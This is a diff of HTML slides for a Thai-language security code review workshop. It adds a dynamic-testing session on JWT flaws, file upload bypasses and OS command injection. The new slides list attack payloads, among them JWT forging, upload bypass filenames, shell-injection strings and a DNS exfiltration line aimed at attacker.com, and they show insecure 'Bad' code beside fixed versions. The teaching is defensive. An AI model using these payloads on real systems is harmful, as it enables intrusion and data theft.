@@ -67,7 +67,7 @@
 <!-- ============================================================ -->
 <section>
   <h1>Security Code Review<br>& Scanning Tools</h1>
-  <p class="subtitle">Hands-on Workshop | 3 Hours</p>
+  <p class="subtitle">Hands-on Workshop | 4 Hours (08:00 - 12:30)</p>
   <br>
   <p style="font-size:0.7em; color:#64748b;">DEVDAY EP.3</p>
   <p style="font-size:0.6em; color:#475569;">Learn to find and fix security vulnerabilities<br>through manual code review and automated scanning tools</p>
@@ -78,18 +78,20 @@
 <!-- ============================================================ -->
 <section>
   <h2>Agenda</h2>
-  <table>
+  <table style="font-size:0.7em;">
     <thead><tr><th>Time</th><th>Session</th></tr></thead>
     <tbody>
-      <tr><td>09:00 - 09:45</td><td>Security Fundamentals & OWASP Top 10</td></tr>
-      <tr><td>09:45 - 10:15</td><td>Manual Code Review + Exercise</td></tr>
-      <tr><td>10:15 - 10:25</td><td>Break</td></tr>
-      <tr><td>10:25 - 10:45</td><td>Security Scanning Tools Overview</td></tr>
-      <tr><td>10:45 - 11:35</td><td>Hands-on Lab — Security Scanning</td></tr>
-      <tr><td>11:35 - 11:55</td><td>CI/CD Integration & Best Practices</td></tr>
-      <tr><td>11:55 - 12:00</td><td>Q&A & Wrap-up</td></tr>
+      <tr><td>08:00 - 08:30</td><td>Registration</td></tr>
+      <tr><td>08:30 - 09:15</td><td>Session 1: Security Fundamentals & OWASP Top 10 + SDLC Intro</td></tr>
+      <tr><td>09:15 - 10:00</td><td>Session 2: Manual Code Review + Hands-on 1</td></tr>
+      <tr><td>10:00 - 10:15</td><td>Break</td></tr>
+      <tr><td>10:15 - 10:45</td><td>Session 3: Security Scanning Tools Overview + ITSC MIS Use Case</td></tr>
+      <tr><td>10:45 - 11:30</td><td>Session 4: Hands-on Lab — Security Scanning & Remediation</td></tr>
+      <tr><td>11:30 - 12:30</td><td>Session 5: Dynamic Testing (JWT / File Upload / OS Command Injection)</td></tr>
+      <tr><td>12:30+</td><td>Lunch</td></tr>
       <!-- NEW -->
-      <tr><td style="color:#eab308;">Bonus</td><td>Appendix: Security Dockerfile & Docker Compose <span class="subtitle">(Self-study)</span></td></tr>
+      <tr><td style="color:#eab308;">Bonus</td><td>Appendix A: Security Dockerfile & Docker Compose <span class="subtitle">(Self-study)</span></td></tr>
+      <tr><td style="color:#eab308;">Bonus</td><td>Appendix B: CI/CD Integration & Best Practices <span class="subtitle">(Self-study)</span></td></tr>
     </tbody>
   </table>
 </section>
@@ -100,7 +102,7 @@
   <p style="color:#94a3b8;">เรียนรู้การตรวจสอบความปลอดภัยของ source code ด้วย manual code review<br>และการใช้เครื่องมือ security scanning tools เพื่อค้นหาช่องโหว่<br>และความเสี่ยงด้านความปลอดภัย ก่อนนำ code ไป deploy จริง</p>
   <div style="margin-top:1.5em; display:flex; gap:1em; justify-content:center; flex-wrap:wrap;">
     <div class="stat-box"><div class="number">5</div><div class="label">Sessions</div></div>
-    <div class="stat-box"><div class="number">3h</div><div class="label">Hands-on</div></div>
+    <div class="stat-box"><div class="number">4h</div><div class="label">Workshop</div></div>
     <div class="stat-box"><div class="number">4+</div><div class="label">Tools</div></div>
   </div>
 </section>
@@ -110,11 +112,11 @@
   <h2>Learning Objectives</h2>
   <p class="subtitle" style="margin-bottom:1em;">เมื่อจบ workshop นี้ ผู้เรียนจะสามารถ:</p>
   <ul>
+    <li>เข้าใจบทบาทของ security scanning ใน <span class="highlight-cyan">SDLC (DevOps infinity loop)</span></li>
     <li>เข้าใจหลักการ secure coding และช่องโหว่ที่พบบ่อย <span class="highlight-cyan">(OWASP Top 10)</span></li>
     <li>ทำ manual code review เพื่อหาจุดอ่อนด้านความปลอดภัย</li>
     <li>ใช้ security scanning tools วิเคราะห์ code อัตโนมัติ</li>
-    <li>ตีความและแก้ไขผลลัพธ์จาก security tools</li>
-    <li>บูรณาการ security scanning เข้ากับ CI/CD pipeline</li>
+    <li>เข้าใจ dynamic testing: <span class="highlight-cyan">JWT / file upload / OS command injection</span></li>
   </ul>
 </section>
 
@@ -188,6 +190,46 @@
         <tr><td>Production</td><td class="highlight-red">100x</td></tr>
       </tbody>
     </table>
+  </section>
+
+  <!-- NEW: SDLC INTRO -->
+  <section>
+    <h2>Security Scanning ในวงจร SDLC</h2>
+    <p class="subtitle">DevOps Infinity Loop — Dev ↔ Ops</p>
+    <br>
+    <p style="font-size:0.85em;">
+      <span class="highlight-green">Plan</span> →
+      <span class="highlight-green">Code</span> →
+      <span class="highlight-cyan">Build</span> →
+      <span class="highlight-cyan">Test</span> →
+      <span class="highlight-yellow">Release</span> →
+      <span class="highlight-yellow">Deploy</span> →
+      <span class="highlight-red">Operate</span> →
+      <span class="highlight-red">Monitor</span>
+    </p>
+    <br>
+    <p class="subtitle" style="font-size:0.75em;">Continuous Integration | Continuous Testing | Continuous Deployment | Continuous Monitoring</p>
+    <br>
+    <p style="font-size:0.8em; color:#94a3b8;">Security ไม่ใช่ขั้นตอนแยก — ต้องไหลผ่านทุก phase ของ loop</p>
+  </section>
+
+  <section>
+    <h2>Security Activity ในแต่ละ Phase</h2>
+    <br>
+    <table style="font-size:0.7em;">
+      <thead><tr><th>Phase</th><th>Security Activity</th></tr></thead>
+      <tbody>
+        <tr><td class="highlight-green">Plan</td><td>Threat modeling, abuse cases</td></tr>
+        <tr><td class="highlight-green">Code</td><td>IDE security plugins, pre-commit (Gitleaks)</td></tr>
+        <tr><td class="highlight-cyan">Build (CI)</td><td>SAST (Semgrep), SCA (Syft + Dependency-Track), Secret scan</td></tr>
+        <tr><td class="highlight-cyan">Test</td><td>DAST baseline</td></tr>
+        <tr><td class="highlight-yellow">Release</td><td>Image scan (Trivy / Grype), policy gate</td></tr>
+        <tr><td class="highlight-yellow">Deploy</td><td>K8s admission control, signed manifests</td></tr>
+        <tr><td class="highlight-red">Operate / Monitor</td><td>Runtime monitoring, vulnerability management, IR</td></tr>
+      </tbody>
+    </table>
+    <br>
+    <p style="font-size:0.65em; color:#64748b;">Reference: DevOps infinity loop — <span class="highlight-cyan">media.geeksforgeeks.org/.../DevOps.png</span></p>
   </section>
 
   <!-- OWASP INTRO -->
@@ -533,8 +575,8 @@ except DatabaseError:
 <section>
   <section>
     <h2>Session 2</h2>
-    <h1>Manual Code Review<br>Techniques</h1>
-    <p class="subtitle">30 minutes</p>
+    <h1>Manual Code Review<br>+ Hands-on 1</h1>
+    <p class="subtitle">45 minutes</p>
   </section>
 
   <!-- CHECKLIST -->
@@ -584,7 +626,7 @@ except DatabaseError:
 <!-- ============================================================ -->
 <section>
   <h1>Break</h1>
-  <p class="subtitle">10 minutes | 10:15 - 10:25</p>
+  <p class="subtitle">15 minutes | 10:00 - 10:15</p>
 </section>
 
 <!-- ============================================================ -->
@@ -594,7 +636,7 @@ except DatabaseError:
   <section>
     <h2>Session 3</h2>
     <h1>Security Scanning<br>Tools Overview</h1>
-    <p class="subtitle">20 minutes</p>
+    <p class="subtitle">30 minutes | + ITSC MIS Use Case</p>
   </section>
 
   <!-- TOOL CATEGORIES -->
@@ -690,6 +732,61 @@ gitleaks protect --staged</code></pre>
       <li>Custom rules ผ่าน <code>.gitleaks.toml</code></li>
     </ul>
   </section>
+
+  <!-- NEW: ITSC MIS USE CASE (frame) -->
+  <section>
+    <h2>ITSC MIS Use Case</h2>
+    <p class="subtitle">Real-world reference architecture — see how each tool slots into a production pipeline</p>
+    <br>
+    <div class="two-col">
+      <div>
+        <h3>Source / CI</h3>
+        <ul style="font-size:0.75em;">
+          <li><strong>GitLab Repo</strong> (source)</li>
+          <li>Unit Testing</li>
+          <li>SAST Scan — <span class="highlight-green">Trivy + Gitleaks</span></li>
+          <li>Build Artifact</li>
+          <li>Docker Image Build & Push <span class="highlight-yellow">(v2.4)</span></li>
+          <li>Grype Security Scan <span class="highlight-yellow">(v2.4)</span></li>
+          <li>Security Policy Check</li>
+          <li>Update Kubernetes Manifest</li>
+        </ul>
+      </div>
+      <div>
+        <h3>CD / DAST / Reporting</h3>
+        <ul style="font-size:0.75em;">
+          <li><strong>CD</strong>: <code>kubectl apply -f ...</code> → K8s Cluster</li>
+          <li><strong>DAST</strong>: Burp-DAST baseline</li>
+          <li><strong>Tracking</strong>:
+            <ul style="font-size:0.9em;">
+              <li>dependency-track</li>
+              <li>DefectDojo</li>
+            </ul>
+          </li>
+          <li><strong>Notifications</strong>:
+            <ul style="font-size:0.9em;">
+              <li><code>notify_ci_pipeline</code></li>
+              <li><code>notify_failure</code></li>
+              <li><code>notify_security_alert</code></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>ITSC MIS — Key Takeaways</h2>
+    <br>
+    <ul>
+      <li>Tools ทุกตัวที่เราเรียนวันนี้ <span class="highlight-green">(Semgrep/Trivy, Syft, Gitleaks, Grype, Dependency-Track, DefectDojo)</span> มีที่ทางจริงใน pipeline</li>
+      <li>Security gate คือ <span class="highlight-yellow">Security Policy Check</span> — ถ้าไม่ผ่าน block ไม่ให้ deploy</li>
+      <li>Notifications 3 ช่อง = ไม่มี silent failure</li>
+      <li>Grype + SBOM = ความต่อเนื่องของ supply-chain visibility ตั้งแต่ build → runtime</li>
+    </ul>
+    <br>
+    <p style="font-size:0.75em; color:#94a3b8;">Pattern เดียวกันนี้ใช้ได้กับ GitHub Actions / Jenkins / ArgoCD — ต่างแค่ tooling</p>
+  </section>
 </section>
 
 <!-- ============================================================ -->
@@ -698,8 +795,8 @@ gitleaks protect --staged</code></pre>
 <section>
   <section>
     <h2>Session 4</h2>
-    <h1>Hands-on Lab<br>Security Scanning</h1>
-    <p class="subtitle">50 minutes</p>
+    <h1>Hands-on Lab<br>Security Scanning & Remediation</h1>
+    <p class="subtitle">45 minutes</p>
   </section>
 
   <!-- LAB SETUP -->
@@ -1086,76 +1183,251 @@ networks:
 </section>
 
 <!-- ============================================================ -->
-<!-- SESSION 5: CI/CD -->
+<!-- SESSION 5: DYNAMIC TESTING -->
 <!-- ============================================================ -->
 <section>
   <section>
     <h2>Session 5</h2>
-    <h1>CI/CD Integration<br>& Best Practices</h1>
-    <p class="subtitle">20 minutes</p>
+    <h1>Dynamic Testing</h1>
+    <p class="subtitle">60 minutes | JWT · File Upload · OS Command Injection</p>
   </section>
 
-  <!-- CI/CD PIPELINE -->
+  <!-- DYNAMIC TESTING INTRO -->
   <section>
-    <h2>Security in CI/CD Pipeline</h2>
+    <h2>What is Dynamic Testing?</h2>
     <br>
-    <table>
-      <thead><tr><th>Stage</th><th>Tool</th><th>Action</th></tr></thead>
+    <p>การทดสอบ application <strong>ขณะรันจริง</strong> (runtime)<br>เพื่อหาช่องโหว่ที่ SAST ตรวจไม่พบ</p>
+    <br>
+    <div class="two-col">
+      <div>
+        <h3>SAST (static)</h3>
+        <ul style="font-size:0.85em;">
+          <li>อ่าน source code</li>
+          <li>ไม่ต้อง run</li>
+          <li>เจอ pattern-based bugs</li>
+          <li>ไม่เห็น runtime behavior</li>
+        </ul>
+      </div>
+      <div>
+        <h3>DAST / Dynamic</h3>
+        <ul style="font-size:0.85em;">
+          <li>ส่ง real request ไปที่ running app</li>
+          <li>เห็น behavior จริง</li>
+          <li>เจอ auth/session bugs, config issues</li>
+          <li>ต้อง deploy ก่อน scan ได้</li>
+        </ul>
+      </div>
+    </div>
+    <br>
+    <p class="subtitle" style="font-size:0.75em;">Session นี้เน้น 3 topic ที่เจอบ่อยใน pentest report: JWT · File Upload · OS Command Injection</p>
+  </section>
+
+  <!-- 5.1 JWT TITLE -->
+  <section>
+    <h2>5.1 JSON Web Token (JWT)</h2>
+    <p class="subtitle">~20 minutes</p>
+    <br>
+    <p style="font-size:0.85em;">JWT ใช้ทุกที่ — API auth, SSO, mobile app — แต่<br>ถ้า implement ผิด = auth bypass ระดับ critical</p>
+    <br>
+    <pre><code class="text">header.payload.signature
+
+{ "alg": "HS256", "typ": "JWT" }
+{ "sub": "user123", "role": "admin", "exp": 1700000000 }
+HMACSHA256(base64url(header) + "." + base64url(payload), SECRET)</code></pre>
+  </section>
+
+  <!-- JWT ATTACKS -->
+  <section>
+    <h2>JWT — Common Attacks</h2>
+    <table style="font-size:0.7em;">
+      <thead><tr><th>Attack</th><th>How</th><th>Impact</th></tr></thead>
       <tbody>
-        <tr><td>Pre-commit</td><td>Gitleaks</td><td>Block secrets before commit</td></tr>
-        <tr><td>Pull Request</td><td>Semgrep</td><td>SAST scan, block on Critical/High</td></tr>
-        <tr><td>Build</td><td>Syft</td><td>Generate SBOM</td></tr>
-        <tr><td>Post-build</td><td>Dependency-Track</td><td>Analyze vulnerabilities</td></tr>
-        <tr><td>Weekly</td><td>Full scan</td><td>Report to team</td></tr>
+        <tr>
+          <td><code>alg=none</code></td>
+          <td>แก้ header เป็น <code>{"alg":"none"}</code>, ลบ signature</td>
+          <td class="highlight-red">Forge any token</td>
+        </tr>
+        <tr>
+          <td>Weak HS256 secret</td>
+          <td>Brute-force ด้วย <code>hashcat -m 16500</code> + wordlist</td>
+          <td class="highlight-red">Forge admin token</td>
+        </tr>
+        <tr>
+          <td>No expiry / replay</td>
+          <td>Token ไม่มี <code>exp</code> — ใช้ได้ตลอดไป</td>
+          <td class="highlight-yellow">Persistent access</td>
+        </tr>
+        <tr>
+          <td>Algorithm confusion</td>
+          <td>RS256 → HS256 — ใช้ RSA public key เป็น HMAC secret</td>
+          <td class="highlight-red">Forge any token</td>
+        </tr>
+        <tr>
+          <td>Missing <code>kid</code> validation</td>
+          <td>Path traversal ใน <code>kid</code> header → อ่านไฟล์ predictable</td>
+          <td class="highlight-red">Signing key leak</td>
+        </tr>
       </tbody>
     </table>
+    <br>
+    <pre class="code-bad"><code class="python"># Bad: accept any alg, no exp check
+jwt.decode(token, secret, options={"verify_signature": False})</code></pre>
   </section>
 
-  <!-- GITHUB ACTIONS EXAMPLE -->
+  <!-- JWT MITIGATIONS -->
   <section>
-    <h2>GitHub Actions Example</h2>
-    <pre class="code-good"><code class="yaml">name: Security Scan
-on: [pull_request]
-
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Semgrep SAST
-        uses: semgrep/semgrep-action@v1
-        with:
-          config: auto
-
-      - name: Gitleaks Secret Scan
-        uses: gitleaks/gitleaks-action@v2
-
-      - name: Generate SBOM
-        run: |
-          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s
-          syft . -o cyclonedx-json > sbom.json
-
-      - name: Upload SBOM
-        uses: actions/upload-artifact@v4
-        with:
-          name: sbom
-          path: sbom.json</code></pre>
-  </section>
-
-  <!-- BEST PRACTICES -->
-  <section>
-    <h2>Best Practices</h2>
+    <h2>JWT — Mitigations</h2>
     <br>
     <ul>
-      <li><span class="highlight-green">Scan Early, Scan Often</span> — ยิ่ง scan เร็ว ค่าแก้ยิ่งต่ำ</li>
-      <li><span class="highlight-green">Automate Everything</span> — security เป็นส่วนหนึ่งของ pipeline</li>
-      <li><span class="highlight-green">Fix Critical First</span> — จัดลำดับตาม severity</li>
-      <li><span class="highlight-green">Track Security Debt</span> — บันทึกและติดตาม issues</li>
-      <li><span class="highlight-green">Regular Updates</span> — อัพเดท dependencies สม่ำเสมอ</li>
-      <li><span class="highlight-green">Security in Every PR</span> — ทุก review มีมุมมอง security</li>
-      <li><span class="highlight-green">Security Champions</span> — มี champion ในแต่ละทีม</li>
+      <li><span class="highlight-green">Enforce <code>alg</code></span> — ไม่ accept <code>none</code>, whitelist เฉพาะที่ใช้</li>
+      <li><span class="highlight-green">Strong secret</span> — 256-bit random (<code>openssl rand -base64 32</code>)</li>
+      <li><span class="highlight-green">Short expiry + refresh tokens</span> — <code>exp</code> 15 min, refresh rotate</li>
+      <li><span class="highlight-green">Validate <code>kid</code></span> — ตรวจสอบให้อยู่ใน allowlist, ไม่ใช้เป็น file path</li>
+      <li><span class="highlight-green">Library hardening</span> — ใช้ library version ล่าสุด, config explicit</li>
     </ul>
+    <br>
+    <pre class="code-good"><code class="python"># Good: strict verification
+jwt.decode(
+    token,
+    secret,
+    algorithms=["HS256"],      # whitelist ONLY
+    options={"require": ["exp", "iat", "sub"]}
+)</code></pre>
+  </section>
+
+  <!-- 5.2 FILE UPLOAD TITLE -->
+  <section>
+    <h2>5.2 File Upload Vulnerabilities</h2>
+    <p class="subtitle">~20 minutes</p>
+    <br>
+    <p>Upload endpoint = attacker's favorite target<br>เพราะถ้าบายพาสได้ → RCE บน server โดยตรง</p>
+  </section>
+
+  <!-- FILE UPLOAD ATTACKS -->
+  <section>
+    <h2>File Upload — Attack Patterns</h2>
+    <table style="font-size:0.7em;">
+      <thead><tr><th>Attack</th><th>Example</th><th>Defense bypassed</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Double extension</td>
+          <td><code>shell.php.jpg</code></td>
+          <td class="highlight-red">Apache misconfig executes .php</td>
+        </tr>
+        <tr>
+          <td>Null byte</td>
+          <td><code>shell.php%00.jpg</code></td>
+          <td class="highlight-red">Legacy PHP truncates</td>
+        </tr>
+        <tr>
+          <td>MIME spoofing</td>
+          <td><code>Content-Type: image/jpeg</code> + PHP body</td>
+          <td class="highlight-red">Server trusts header</td>
+        </tr>
+        <tr>
+          <td>Path traversal</td>
+          <td><code>filename=../../etc/passwd</code></td>
+          <td class="highlight-red">Overwrites system files</td>
+        </tr>
+        <tr>
+          <td>Polyglot</td>
+          <td>Valid JPG header + PHP payload</td>
+          <td class="highlight-red">Magic-byte check passes</td>
+        </tr>
+      </tbody>
+    </table>
+    <br>
+    <pre class="code-bad"><code class="python"># Bad: blocklist extensions, trust Content-Type
+if not filename.endswith(".php"):
+    open("/var/www/uploads/" + filename, "wb").write(data)</code></pre>
+  </section>
+
+  <!-- FILE UPLOAD MITIGATIONS -->
+  <section>
+    <h2>File Upload — Mitigations</h2>
+    <br>
+    <ul>
+      <li><span class="highlight-green">Extension allowlist</span> (ไม่ใช่ blocklist) — <code>.jpg/.png/.pdf</code></li>
+      <li><span class="highlight-green">Magic-byte validation</span> — python-magic / libmagic ตรวจ bytes จริง</li>
+      <li><span class="highlight-green">Store outside webroot</span> — serve ผ่าน app, not via URL path</li>
+      <li><span class="highlight-green">Randomize filenames</span> — <code>uuid4() + verified_ext</code></li>
+      <li><span class="highlight-green">ClamAV scan</span> async ก่อน serve</li>
+      <li><span class="highlight-green">Separate domain</span> — <code>user-content.example.com</code> (cookie isolation)</li>
+    </ul>
+    <br>
+    <pre class="code-good"><code class="python">ALLOWED = {"jpg","png","pdf"}
+ext = magic.from_buffer(data, mime=True)  # real MIME
+if ext not in ALLOWED_MIMES: reject()
+safe = f"{uuid.uuid4()}.{ext}"
+# store at /srv/uploads (outside webroot)</code></pre>
+  </section>
+
+  <!-- 5.3 OS COMMAND INJECTION TITLE -->
+  <section>
+    <h2>5.3 OS Command Injection</h2>
+    <p class="subtitle">~20 minutes</p>
+    <br>
+    <p>เมื่อ user input ไหลเข้า <code>system()</code>, <code>exec()</code>, <code>os.popen()</code>, หรือ <code>subprocess(shell=True)</code><br>→ attacker execute arbitrary command บน server</p>
+  </section>
+
+  <!-- CMD INJECTION ATTACKS -->
+  <section>
+    <h2>OS Command Injection — Patterns</h2>
+    <div class="two-col">
+      <div>
+        <h3>Shell metacharacters</h3>
+        <pre><code class="bash">; cmd       # chain
+| cmd       # pipe
+&amp;&amp; cmd      # conditional
+$(cmd)      # substitution
+`cmd`       # backtick
+&gt; file      # redirect</code></pre>
+      </div>
+      <div>
+        <h3>Argument injection</h3>
+        <pre><code class="bash"># ping target
+user: --help
+user: -f -i10000 victim.com
+# curl
+user: -o /etc/passwd http://x</code></pre>
+      </div>
+    </div>
+    <br>
+    <h3>Blind / Time-based detection</h3>
+    <pre class="code-bad"><code class="bash"># No output returned? Use timing:
+user_input = "; sleep 10"
+# Or DNS exfil:
+user_input = "; nslookup $(whoami).attacker.com"</code></pre>
+  </section>
+
+  <!-- CMD INJECTION MITIGATIONS -->
+  <section>
+    <h2>OS Command Injection — Mitigations</h2>
+    <br>
+    <ul>
+      <li><span class="highlight-green">ไม่ใช้ <code>shell=True</code></span></li>
+      <li><span class="highlight-green">Subprocess ด้วย arg array</span> (ไม่ string concat)</li>
+      <li><span class="highlight-green">Allowlist inputs</span> — regex <code>^[a-zA-Z0-9._-]+$</code></li>
+      <li><span class="highlight-green">shlex.quote</span> ถ้าต้องสร้าง shell command จริงๆ</li>
+      <li><span class="highlight-green">Principle of least privilege</span> — app ไม่ควรมีสิทธิ์เขียนไฟล์ระบบ</li>
+    </ul>
+    <br>
+    <div class="two-col">
+      <div>
+        <pre class="code-bad"><code class="python"># Bad
+os.system(f"ping {host}")
+subprocess.call(
+  f"ping {host}", shell=True)</code></pre>
+      </div>
+      <div>
+        <pre class="code-good"><code class="python"># Good
+if not re.fullmatch(r"[\w.-]+", host):
+    raise ValueError
+subprocess.run(
+  ["ping", "-c", "1", host],
+  shell=False, timeout=5)</code></pre>
+      </div>
+    </div>
   </section>
 </section>
 
@@ -1169,51 +1441,48 @@ jobs:
     <div class="two-col">
       <div>
         <h3>What We Covered</h3>
-        <ul>
+        <ul style="font-size:0.85em;">
+          <li>SDLC + shift-left security</li>
           <li>OWASP Top 10</li>
           <li>Manual code review</li>
           <li>Semgrep (SAST)</li>
           <li>Syft + Dependency-Track (SCA)</li>
           <li>Gitleaks (Secrets)</li>
-          <li>Docker security (Dockerfile + compose)</li>
-          <li>CI/CD integration</li>
+          <li>ITSC MIS pipeline reference</li>
+          <li>Dynamic testing: JWT / Upload / Cmd Injection</li>
         </ul>
       </div>
       <div>
         <h3>Tools Summary</h3>
         <table style="font-size:0.75em;">
-          <tr><td>SAST</td><td class="highlight-green">Semgrep</td></tr>
+          <tr><td>SAST</td><td class="highlight-green">Semgrep, Trivy</td></tr>
           <tr><td>SCA</td><td class="highlight-green">Syft</td></tr>
           <tr><td>Vuln Mgmt</td><td class="highlight-green">Dependency-Track</td></tr>
           <tr><td>Aggregator</td><td class="highlight-green">DefectDojo</td></tr>
           <tr><td>Secrets</td><td class="highlight-green">Gitleaks</td></tr>
-          <tr><td>Container</td><td class="highlight-green">Trivy, Syft</td></tr>
-          <tr><td>CI/CD</td><td class="highlight-green">GitHub Actions</td></tr>
+          <tr><td>Image Scan</td><td class="highlight-green">Grype, Trivy</td></tr>
+          <tr><td>DAST</td><td class="highlight-green">Burp / ZAP baseline</td></tr>
         </table>
       </div>
     </div>
   </section>
 
-  <!-- Q&A -->
-  <section>
-    <h1>Q&A</h1>
-    <br>
-    <p>Resources:</p>
-    <ul style="font-size:0.8em;">
-      <li>OWASP Top 10 — <span class="highlight-cyan">owasp.org/Top10/2025</span></li>
-      <li>Semgrep — <span class="highlight-cyan">semgrep.dev</span></li>
-      <li>Syft — <span class="highlight-cyan">github.com/anchore/syft</span></li>
-      <li>Dependency-Track — <span class="highlight-cyan">dependencytrack.org</span></li>
-      <li>Gitleaks — <span class="highlight-cyan">github.com/gitleaks/gitleaks</span></li>
-    </ul>
-    <br>
-    <p style="font-size:0.7em; color:#64748b;">Workshop materials: <span class="highlight-cyan">github.com/Wsangsrichan/DEVDAY-EP-3</span></p>
-  </section>
-
-  <!-- THANK YOU -->
+  <!-- THANK YOU + RESOURCES + Q&A (merged) -->
   <section>
     <h1>Thank You!</h1>
-    <p class="subtitle">Happy Secure Coding</p>
+    <p class="subtitle">Happy Secure Coding — Questions welcome anytime</p>
+    <br>
+    <p style="font-size:0.8em;">Resources:</p>
+    <ul style="font-size:0.7em;">
+      <li>OWASP Top 10 — <span class="highlight-cyan">owasp.org/Top10/2025</span></li>
+      <li>Semgrep — <span class="highlight-cyan">semgrep.dev</span></li>
+      <li>Syft / Grype — <span class="highlight-cyan">github.com/anchore</span></li>
+      <li>Dependency-Track — <span class="highlight-cyan">dependencytrack.org</span></li>
+      <li>Gitleaks — <span class="highlight-cyan">github.com/gitleaks/gitleaks</span></li>
+      <li>JWT attacks — <span class="highlight-cyan">portswigger.net/web-security/jwt</span></li>
+    </ul>
+    <br>
+    <p style="font-size:0.7em; color:#64748b;">Workshop materials: <span class="highlight-cyan">github.com/watcharap0ng/DEVDAY-EP-3</span></p>
   </section>
 </section>
 
